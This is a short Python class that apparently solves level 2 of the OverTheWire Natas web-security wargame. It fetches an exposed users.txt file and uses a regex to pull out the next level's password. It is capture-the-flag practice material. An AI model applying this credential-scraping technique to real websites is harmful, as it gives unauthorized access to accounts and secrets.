import re
from .base_solver import NatasSolver

class Natas2Solver(NatasSolver):
    def solve(self) -> str:
        # Access users.txt file in /files directory
        response = self.make_request("files/users.txt")
        match = re.findall(r"natas3:(.*)", response.text)
        if not match:
            raise ValueError("Could not find password")
        return match[0].strip()